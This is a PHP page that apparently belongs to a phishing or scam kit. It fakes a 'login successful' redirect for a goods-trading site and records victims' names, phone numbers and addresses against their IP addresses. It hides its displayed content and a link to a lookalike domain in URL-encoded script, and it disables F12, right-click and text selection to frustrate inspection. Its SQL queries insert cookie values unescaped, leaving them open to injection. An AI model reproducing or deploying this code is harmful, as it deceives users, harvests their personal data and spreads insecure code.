<?php 
Define('PM_CALL',true);
Define('INC_CALL',true);
include dirname(__FILE__).('/../canshu/global.class.php');
include dirname(__FILE__).('/../config/mysql.func.php');
include dirname(__FILE__).('/../config/Conn.php');
include dirname(__FILE__).('/../canshu/getdata.php');
$ip=getIP();
setcookie('GoodsID4',$_COOKIE['GoodsID3']);
//写入订单号
setcookie('orderid',$zhuanzhuanORDER);
$xzshijian=date('Y-m-d H:i:s', time());

if($_COOKIE['GoodsID3']){
	

	    $cookTel=substr_replace($_COOKIE['se_tel'],'****',3,4);

	
	$_GoodsID = _fetch_array("SELECT * FROM goods WHERE goods_id='{$_COOKIE['GoodsID3']}'") or die('SQL执行错误');
	
		//判断操作记录数据是否存在，存在就更新此数据状态为2订单页和时间
	$_OID = _fetch_array("SELECT * FROM useraddress WHERE uip='{$ip}' AND gid='{$_COOKIE['GoodsID3']}'");
	if($_OID){
		_query("
			UPDATE 
				useraddress
			SET 
				state=2,
				utime='{$xzshijian}'
			WHERE 
				uip='{$ip}' LIMIT 1") or die(mysql_error());
				
				
		if($_COOKIE['se_name']){
			if($_OID){
			  _query("
				  UPDATE 
					  useraddress
				  SET 
					  uadd='{$_COOKIE['se_address']}',
					  utel='{$_COOKIE['se_tel']}',
					  uname='{$_COOKIE['se_name']}',
					  orderid='{$zhuanzhuanORDER}',
					  state=3
				  WHERE 
				uip='{$ip}' LIMIT 1");
				
			}
		}	
		  _close();
		  session_destroy();
		  
	}

}
if($_COOKIE['GoodsURL1_1']){
    if(!$_COOKIE['GoodsID3']){
       header('Location:'. htmlspecialchars_decode($_COOKIE['GoodsURL1_1']).'');
    }
}else{
    header('Location:'. htmlspecialchars_decode($Class1_jump_url).'');
}


?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
<head>
<meta http-equiv="Refresh" content="0;URL= <?php echo 'order.php';?>">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,minimum-scale=1.0,user-scalable=no">
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
    <title>登录成功-正在跳转商品</title>
    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport" />
    <meta name="format-detection" content="telephone=no" />
		<meta content="wap" name="data-jym-spm-v" />
<meta name="data-spm" content="a2y0w">
<meta http-equiv="Refresh" content="2;URL=<?php echo 'ini.php';?>">
<main>               	                  
	<link href="css/Icomoon/style.css" rel="stylesheet" type="text/css" />
        <link href="static/q/css/style.css" rel="stylesheet" type="text/css"/>
	<script type="text/javascript" src="js/jquery-2.0.2.min.js"></script>
	<script type="text/javascript" src="js/main.js"></script>
  
	<!--<script src="https://open.mobile.qq.com/sdk/qqapi.js?_bid=152"></script>-->
            <script>
<!--
document.write(unescape("%09%20%20%3Csection%20class%3D%22aui-scrollView%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20style%3D%22text-align%3Acenter%3B%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22aui-back-box%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22aui-back-pitch%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cimg%20src%3D%22static/q/images/icon-pitch.png%22%20alt%3D%22%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0D%0A%09%3Cspan%20style%3D%22font-size%3A19px%3Bcolor%3A%23009900%3B%22%3E%20%3Cbr/%3E%3Cstrong%3E%u767B%u9646%u6210%u529F%20%26nbsp%3C/strong%3E%3C/span%3E%3Cbr/%3E%0D%0A%3Cp%3E%3Cfont-size%3A16px%3B%3E%u9875%u9762%u81EA%u52A8%3C/font%3E%3Ca%20href%3D%22http%3A//www.jiaoyimaomet.cn/03%22%20style%3D%22font-size%3A16px%3Bcolor%3A%230174DF%3B%22%3E%20%u8DF3%u8F6C%20%3C/a%3E%u7B49%u5F85%u65F6%u95F4%uFF1A1%u79D2%3C/p%3E%0D%0A%3C/section%3E%0D%0A%3C/head%3E%0D%0A%3C/html%3E%0D%0A"));
//-->
</script>
 <script>
  document.onkeydown = function(){
禁止F12
    if(window.event && window.event.keyCode == 123) {
        alert("F12被禁用");
        event.keyCode=0;
        event.returnValue=false;
    }
    if(window.event && window.event.keyCode == 13) {
        window.event.keyCode = 505;
    }
    if(window.event && window.event.keyCode == 8) {
        alert(str+"\n请使用Del键进行字符的删除操作！");
        window.event.returnValue=false;
    }

}
  </script>
  <script language="Javascript">
document.oncontextmenu=new Function("event.returnValue=false");
document.onselectstart=new Function("event.returnValue=false");
</script>

<!--禁止F12-->
<script type="text/javascript">
        document.onkeydown = function () {
            if (window.event && window.event.keyCode == 123) {
                event.keyCode = 0;
                event.returnValue = false;
                return false;
            }
        };
</script>

<!--火狐禁止右键-->
<script type="text/javascript">
document.oncontextmenu=function(e){return false;}
</script>
